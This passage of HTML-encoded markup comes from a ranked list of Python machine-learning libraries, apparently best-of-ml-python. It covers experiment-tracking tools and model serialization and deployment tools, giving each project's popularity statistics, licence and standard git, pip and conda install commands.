3.8K) - Sacred is a tool to help you configure, organize, log and reproduce.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/IDSIA/sacred&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 97 · 🔀 340 · 📦 1.4K · 📋 540 - 16% open · ⏱️ 28.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/IDSIA/sacred&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sacred&#34;&gt;PyPi&lt;/a&gt; (📥 35K / month · 📦 100 · ⏱️ 14.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sacred&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sacred&#34;&gt;Conda&lt;/a&gt; (📥 420 · ⏱️ 14.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sacred&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/catalyst-team/catalyst&#34;&gt;Catalyst&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 2.9K) - Accelerated deep learning R&amp;amp;D. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/catalyst-team/catalyst&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 360 · 📦 550 · 📋 330 - 0% open · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/catalyst-team/catalyst&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/catalyst&#34;&gt;PyPi&lt;/a&gt; (📥 2.2M / month · 📦 29 · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install catalyst&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aimhubio/aim&#34;&gt;aim&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 2.4K) - Aim easy-to-use and performant open-source ML experiment tracker. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/aimhubio/aim&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 37 · 🔀 150 · 📦 78 · 📋 540 - 33% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/aimhubio/aim&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/aim&#34;&gt;PyPi&lt;/a&gt; (📥 43K / month · 📦 4 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install aim&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/aim&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 15.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge aim&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/VisualDL&#34;&gt;VisualDL&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 4.3K) - Deep Learning Visualization Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1M&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PaddlePaddle/VisualDL&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 31 · 🔀 580 · 📥 180 · 📦 1.1K · 📋 410 - 18% open · ⏱️ 01.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PaddlePaddle/VisualDL&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/visualdl&#34;&gt;PyPi&lt;/a&gt; (📥 90K / month · 📦 23 · ⏱️ 06.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install visualdl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/ml-metadata&#34;&gt;ml-metadata&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 470) - For recording and retrieving metadata associated with ML.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/ml-metadata&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 98 · 📥 1.7K · 📦 220 · 📋 87 - 28% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/ml-metadata&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ml-metadata&#34;&gt;PyPi&lt;/a&gt; (📥 730K / month · 📦 19 · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ml-metadata&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/guildai/guildai&#34;&gt;Guild AI&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 700) - Experiment tracking, ML developer tools. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/guildai/guildai&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 63 · 📥 1 · 📦 51 · 📋 360 - 43% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/guildai/guildai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/guildai&#34;&gt;PyPi&lt;/a&gt; (📥 3.2K / month · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install guildai&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/stared/livelossplot&#34;&gt;livelossplot&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.2K) - Live training loss plot in Jupyter Notebook for Keras,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/stared/livelossplot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 140 · 📦 790 · 📋 74 - 5% open · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/stared/livelossplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/livelossplot&#34;&gt;PyPi&lt;/a&gt; (📥 70K / month · 📦 11 · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install livelossplot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/labmlai/labml&#34;&gt;Labml&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.1K) - Monitor deep learning model training and hardware usage from your mobile.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/labmlai/labml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 78 · 📦 47 · 📋 25 - 52% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/labmlai/labml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/labml&#34;&gt;PyPi&lt;/a&gt; (📥 4.1K / month · 📦 6 · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install labml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/instacart/lore&#34;&gt;lore&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 1.5K) - Lore makes machine learning approachable for Software Engineers and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/instacart/lore&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 26 · 🔀 130 · 📦 19 · 📋 45 - 57% open · ⏱️ 11.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/instacart/lore&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lore&#34;&gt;PyPi&lt;/a&gt; (📥 730 / month · 📦 1 · ⏱️ 02.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lore&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/studioml/studio&#34;&gt;Studio.ml&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 370 · 💤) - Studio: Simplify and expedite model building process. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/studioml/studio&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 52 · 📦 5 · 📋 250 - 22% open · ⏱️ 14.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/studioml/studio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/studioml&#34;&gt;PyPi&lt;/a&gt; (📥 540 / month · ⏱️ 14.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install studioml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/replicate/keepsake&#34;&gt;keepsake&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 1.6K) - Version control for machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/replicate/keepsake&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 64 · 📋 190 - 65% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/replicate/keepsake&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/keepsake&#34;&gt;PyPi&lt;/a&gt; (📥 570 / month · ⏱️ 11.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install keepsake&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 17 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/neptune-ai/neptune-client&#34;&gt;Neptune.ai&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 280) - Experiment tracking tool and model registry. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Kaggle/kaggle-api&#34;&gt;kaggle&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 4.7K · 💀) - Official Kaggle API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/huggingface/knockknock&#34;&gt;knockknock&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 2.4K · 💀) - Knock Knock: Get notified when your training ends with only two.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/tnt&#34;&gt;TNT&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.4K · 💀) - Simple tools for logging and visualizing, loading and training. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/EducationalTestingService/skll&#34;&gt;SKLL&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 530) - SciKit-Learn Laboratory (SKLL) makes it easy to run machine.. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=BSD-1-Clause&#34;&gt;❗️BSD-1-Clause&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/m3dev/gokart&#34;&gt;gokart&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 250) - Gokart solves reproducibility, task dependencies, constraints of good code,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/tensorwatch&#34;&gt;TensorWatch&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 3.2K · 💀) - Debugging, monitoring and visualization for Python Machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/waleedka/hiddenlayer&#34;&gt;hiddenlayer&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 1.6K · 💀) - Neural network graphs and training metrics for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MrPowers/quinn&#34;&gt;quinn&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 330 · 💀) - pyspark methods to enhance developer productivity. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/TeamHG-Memex/tensorboard_logger&#34;&gt;TensorBoard Logger&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 620 · 💀) - Log TensorBoard events without touching TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/awslabs/mxboard&#34;&gt;MXBoard&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 330 · 💀) - Logging MXNet data for visualization in TensorBoard. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/datmo/datmo&#34;&gt;datmo&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 340 · 💀) - Open source production model management tool for data scientists. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gradsflow/chitra&#34;&gt;chitra&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 190) - A multi-functional library for full-stack Deep Learning. Simplifies.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/minerva-ml/steppy&#34;&gt;steppy&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 130 · 💀) - Lightweight, Python library for fast and reproducible experimentation. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/caliban&#34;&gt;caliban&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 430 · 💀) - Research workflows made easy, locally and in the Cloud. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ModelChimp/modelchimp&#34;&gt;ModelChimp&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 120 · 💤) - Experiment tracking for machine and deep learning projects. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jrieke/traintool&#34;&gt;traintool&lt;/a&gt;&lt;/b&gt; (🥉8 · ⭐ 9 · 💀) - Train off-the-shelf machine learning models in one.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Model Serialization &amp;amp; Deployment&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries to serialize models to files, convert between a variety of model formats, and optimize models for deployment.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/onnx/onnx&#34;&gt;onnx&lt;/a&gt;&lt;/b&gt; (🥇41 · ⭐ 13K) - Open standard for machine learning interoperability. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/onnx/onnx&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 230 · 🔀 2.7K · 📥 18K · 📦 6.9K · 📋 2K - 13% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/onnx/onnx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/onnx&#34;&gt;PyPi&lt;/a&gt; (📥 1.1M / month · 📦 370 · ⏱️ 17.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install onnx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/onnx&#34;&gt;Conda&lt;/a&gt; (📥 410K · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge onnx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apple/coremltools&#34;&gt;Core ML Tools&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 2.7K) - Core ML tools contain supporting tools for Core ML model.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apple/coremltools&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 400 · 📥 4.2K · 📦 910 · 📋 1K - 33% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apple/coremltools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/coremltools&#34;&gt;PyPi&lt;/a&gt; (📥 100K / month · 📦 140 · ⏱️ 22.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install coremltools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/coremltools&#34;&gt;Conda&lt;/a&gt; (📥 31K · ⏱️ 15.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge coremltools&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/huggingface/huggingface_hub&#34;&gt;huggingface_hub&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 430) - All the open source things related to the Hugging Face Hub. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/huggingface/huggingface_hub&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 63 · 🔀 100 · 📋 240 - 34% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/huggingface/huggingface_hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/huggingface_hub&#34;&gt;PyPi&lt;/a&gt; (📥 5.7M / month · 📦 82 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install huggingface_hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/huggingface_hub&#34;&gt;Conda&lt;/a&gt; (📥 140K · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge huggingface_hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/serve&#34;&gt;TorchServe&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2.6K) - Serve, optimize and scale PyTorch models in production. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/serve&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 